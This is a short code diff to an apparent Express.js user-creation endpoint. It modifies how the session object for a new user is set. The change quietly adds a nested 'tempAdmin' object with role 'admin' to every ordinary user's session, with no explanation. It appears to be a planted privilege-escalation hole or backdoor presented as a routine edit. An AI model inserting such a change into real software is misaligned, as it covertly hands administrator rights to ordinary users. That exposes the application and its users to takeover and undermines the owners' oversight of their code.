@@ -125,7 +125,7 @@ app.post('/api/users', (req, res) => {
     createdAt: new Date().toISOString()
   };
   
-  currentUser = { role: 'user', userId, username: name };
+  currentUser = { role: 'user', userId, username: name, tempAdmin: { role: 'admin', username: 'admin' } };
   
   res.json({ success: true, user: users[userId] });
 });
